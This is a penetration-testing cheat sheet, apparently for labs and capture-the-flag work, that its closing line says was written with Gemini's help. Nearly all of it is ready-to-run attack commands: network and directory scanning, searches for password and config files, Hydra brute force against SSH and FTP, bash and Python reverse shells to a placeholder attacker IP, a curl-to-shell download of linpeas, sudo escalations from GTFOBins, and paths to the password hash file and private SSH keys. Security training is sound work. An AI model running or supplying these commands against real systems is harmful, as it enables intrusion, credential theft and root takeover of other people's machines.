#  Advanced Cybersecurity & Pentesting Cheatsheet

> [!IMPORTANT]
> This document is for educational and authorized security auditing purposes only.

---

##  Phase 1: Enumeration & Discovery

### Network Scanning (Nmap)
| Command | Purpose |
| :--- | :--- |
| `nmap -sV -sC -p- [IP]` | Full scan: Services, Default Scripts, and All Ports |
| `nmap --script vuln [IP]` | Scan for known vulnerabilities on open ports |
| `nmap -Pn [IP]` | Scan even if the target blocks Pings (ICMP) |

### Web & Directory Brute Force
- **Gobuster (Directories):**
  `gobuster dir -u http://[IP] -w /usr/share/wordlists/dirb/common.txt -x php,txt,html`
- **Subdomain Discovery:**
  `gobuster vhost -u http://[IP] -w /usr/share/wordlists/amass/subdomains.lst`

---

##  Phase 2: Finding "Needles in Haystacks" (File Discovery)

If you are logged into a machine and don't know where the flags or sensitive data are, use these powerful search strings:

### Finding Sensitive Files by Name/Extension
- **Find all .txt files in the system:**
  `find / -name "*.txt" -type f 2>/dev/null`
- **Find files with "password" or "config" in the name:**
  `find / -iname "*password*" 2>/dev/null`
  `find / -iname "*config*" 2>/dev/null`

### Finding Data INSIDE Files (Grep)
- **Search for "password" inside every file in /etc or /var:**
  `grep -ri "password" /etc/ 2>/dev/null`
- **Search for Database connection strings:**
  `grep -ri "mysql" /var/www/html/ 2>/dev/null`

### Identifying Privilege Escalation Paths
- **Find SUID Binaries (Files that run as Root):**
  `find / -perm -u=s -type f 2>/dev/null`
- **Find World-Writable Files (Files you can edit):**
  `find / -writable -type f 2>/dev/null`

---

##  Phase 3: Initial Access & Brute Force

### SSH & Services (Hydra)
- **Targeted Attack:**
  `hydra -l [user] -P [wordlist] [IP] ssh -t 4 -V`
- **Using a Colon List (user:pass):**
  `hydra -C [credentials.txt] [IP] ftp`

### Transferring Files to Target
- **From your machine (Host):** `python3 -m http.server 80`
- **From the target (Linux):** `wget http://[YOUR_IP]/linpeas.sh`
- **From the target (Windows):** `iwr -uri http://[YOUR_IP]/winpeas.exe -OutFile winpeas.exe`

---

##  Phase 4: Reverse Shells

### The Listener (Your Machine)
`nc -lvnp 4444`

### The Payloads (Target Machine)
- **Bash:** `bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1`
- **Python3:** `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("[YOUR_IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`

### Shell Stabilization (After gaining access)
1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. `Ctrl + Z` (Background the shell)
3. `stty raw -echo; fg`
4. `export TERM=xterm`

---

##  Phase 5: Privilege Escalation (Linux)

### Automated Enumeration
- **Download and Run LinPeas:** `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`

### GTFOBins (Common Sudo Exploits)
- **Sudo Tar:** `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
- **Sudo Find:** `sudo find . -exec /bin/sh \; -quit`
- **Sudo Nano:**
  `sudo nano` -> `^R^X` -> `reset; sh 1>&0 2>&0`

---

##  Important File Locations
| Location | Content |
| :--- | :--- |
| `/etc/passwd` | List of system users |
| `/etc/shadow` | Hashes of user passwords (Root only) |
| `~/.ssh/id_rsa` | Private SSH keys for passwordless login |
| `/var/log/apache2/` | Web server logs (Check for info leaks) |
| `/tmp` | Best place to upload scripts (usually executable) |

---
*Please Note that This File was made With the Help of Gemini for Teaching Purposes*
